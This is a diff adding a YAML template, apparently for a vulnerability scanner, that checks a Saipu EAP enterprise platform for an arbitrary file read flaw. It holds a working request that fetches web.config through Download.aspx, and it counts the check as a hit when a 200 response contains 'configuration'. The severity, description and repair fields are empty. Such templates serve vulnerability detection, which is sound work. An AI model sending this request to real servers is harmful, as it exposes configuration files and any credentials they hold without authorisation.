@@ -1,0 +1,21 @@
+id:
+
+info:
+  name: 赛普EAP企业适配管理平台 Download.aspx 任意文件读取
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: GET
+  path: /IDWebSoft/Common/Handler/Download.aspx?FileName=web.config&FileTitle=
+  headers:
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82Safari/537.36
+    Content-Type: application/x-www-form-urlencoded
+    Accept: '*/*'
+    Connection: Keep-Alive
+response1:
+  body: configuration
+  code: 200
+requests2:
+response2:
